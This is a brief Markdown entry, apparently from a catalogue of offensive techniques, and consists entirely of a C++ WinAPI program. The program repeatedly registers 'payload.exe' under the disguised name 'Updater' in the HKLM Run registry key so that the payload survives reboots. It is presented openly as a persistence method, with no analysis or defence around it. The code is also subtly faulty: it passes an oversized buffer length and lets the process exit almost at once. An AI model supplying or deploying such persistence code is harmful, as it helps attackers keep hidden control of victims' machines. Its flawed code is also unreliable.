# WinAPI

## C++

```cpp
#include <windows.h>

DWORD WINAPI Persistence() {
    char value[] = "payload.exe";
    HKEY handle_key;

    while (1) {
        ::RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &handle_key);
        ::RegSetValueEx(handle_key, "Updater", 0, REG_SZ, (LPBYTE)value, 60);
        ::RegCloseKey(handle_key);
        ::Sleep(10000);
    }
    return 0;
}

INT WINAPI wWinMain(
_In_ HINSTANCE hInstance,
_In_opt_ HINSTANCE PrevInstance,
_In_ PWSTR szCmdLine,
_In_ INT nShowCmd
) {
    ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Persistence, NULL, 0, NULL);
    ::Sleep(1000);
    return 0;
}
```